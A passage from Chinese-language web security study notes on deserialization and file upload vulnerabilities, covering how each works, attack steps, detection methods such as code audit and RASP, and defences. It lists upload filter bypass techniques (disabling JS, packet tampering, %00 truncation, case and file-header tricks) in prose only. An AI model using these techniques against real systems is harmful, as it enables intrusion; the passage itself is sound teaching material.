RASP 和 IAST 使用相同的 Agent 技术，不同之处在于 RASP 更偏向于拦截防御，而 IAST 更偏向于安全测试，若将 RASP 结合 DAST 共用的话，就可以达到 IAST 的效果了

## 5. 反序列化漏洞

### (1) 反序列化漏洞

* **序列化**：将对象转换成字符串，便于在网络上传输或保存在本地文件，例如 `JSON.stringify`
* **反序列化**：将字符串快速地重建成对象，提高工作效率，例如 `JSON.parse()`
* **反序列化漏洞**：攻击者传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至函数，这些方法在某些情况下会被自动调用，为实现任意代码执行提供了条件，这就产生了反序列化漏洞

### (2) 反序列化漏洞攻击

* 寻找源程序中可利用的危险方法，例如 eval()
* 追踪`调用第一步中危险方法的其他方法`
* 追踪`控制第一步中危险方法参数的其他方法`
* 编写恶意对象，然后调用序列化方法生成序列化字符串
* 将生成的序列化字符串传递给漏洞参数

### (3) 反序列化漏洞挖掘

#### ① 代码审计

主动检测一些反序列化漏洞，最好的方法就是代码审计，针对不同语言的反序列化函数，往上回溯参数的传递来源，查看是否有外部可控数据引用，而又没有任何过滤，那么就有可能存在反序列化漏洞

#### ② 运行时应用程序自我保护（Runtime Application Self-Protection，RASP）

RASP 是通过`搜集和分析应用程序运行时的相关信息`来检测和阻止针对应用程序本身的攻击的技术

RASP 可以针对不同语言做一些 Hook，如果发现一些敏感函数（例如 eval）被执行就打印出栈回溯，方便追踪漏洞

#### ③ 动态黑盒扫描

通过收集历史漏洞的 payload，再结合网站指纹识别，特别是第三方库的识别，然后再根据不同的第三方库发送对应的 payload，根据返回结果作漏洞是否存在的判断

### (4) 反序列化漏洞防御

#### ① 黑白名单限制

针对反序列化的类做一份白名单或黑名单的限制，首选白名单，避免一些遗漏问题被绕过

#### ② WAF（Web 防火墙）

WAF 收集各种语言的反序列化攻击数据，提取特征用于拦截请求

#### ③ 运行时应用程序自我保护（Runtime Application Self-Protection，RASP）

RASP 是通过`搜集和分析应用程序运行时的相关信息`来检测和阻止针对应用程序本身的攻击的技术

RASP 除了可以检测漏洞外，它本身也可以提供类似 WAF 的防御功能

## 6. 文件上传漏洞

### (1) 文件上传漏洞

文件上传漏洞是在文件上传过程中`未对用户上传的文件数据做有效过滤或过滤不严`，导致上传的恶意文件被服务端解析执行，利用漏洞获得系统控制权

### (2) 文件上传漏洞攻击

#### ① 禁用 JS

很多时候开发仅在前端 JS 上限制上传文件后缀名，这种情况下安装个 `NoScript` 插件禁用 JS 再上传即可绕过

#### ② 篡改数据包

很多时候开发仅在前端 JS 上限制上传文件后缀名，这种情况下还可以使用 `BurpSuite` 等工具构造数据包去发送请求，不经过浏览器前端 JS 的处理，从而绕过限制

#### ③ %00 截断

前端限制文件上传漏洞的能力比较弱，如果服务端限制上传文件不当，仍有可能被绕过，例如对文件后缀、路径的检测，有时可以通过添加 %00 截断来绕过

#### ④ 大小写绕过

前后端检测文件名，且未区分大小写时，可通过大小写绕过

#### ⑤ 文件头绕过

不同文件格式有不同文件头，可以在文件前面加个图片文件头，看是否可以绕过限制

![文件头]()

#### ⑥ 后缀别名绕过

有些执行脚本存在多个后缀别名，若检测不全仍有可能被绕过，

#### ⑦ 结合其他漏洞绕过

可利用一些服务器的解析漏洞来绕过

### (3) 文件上传漏洞挖掘

#### ① 白盒审计

直接审计源代码，可以先从读取文件的函数入手，看其参数是否有来源于污染源的数据，并且中间无任何上传限制，那么就可能存在文件上传漏洞

#### ② 黑盒扫描

爬虫网页时，若发现存在文件上传功能，就自动构造请求，现根据返回包特征判断是否上传成功，然后再去寻找上传路径

#### ③ 流量监控

黑盒扫描难以确认上传文件的路径，因此流量监控成为常用方法，通过监测流量中疑似的 webshell，获取相关请求数据告警出来，然后再人工确认，用这种方法在实际业务中可以发现上传漏洞

### (4) 文件上传漏洞防御

* **限制上传文件大小**：避免恶意上传大文件导致存储空间不足，进而网站无法正常运行
* **白名单限制**：严格检测并限制上传文件后缀名、文件头、Content-type 等
* **上传文件重命名**：建议随机文件名
* **隐藏上传文件路径相关信息**：关闭错误回显等
* **上传文件重编码**：对图片或视频做转换处理
* **使用 WAF 拦截木马的上传**：这种可能比较容易被绕过
* **使用 RASP 在服务端中对于执行脚本的关键函数进行 hook**：在触发外部数据输入执行时就告警和阻断
* **服务端本地检测 Webshell**：发现后告警出来，人工确认后再删除，同时排查是否为外部入侵导致的，查日志去追踪可能存在的漏洞来源
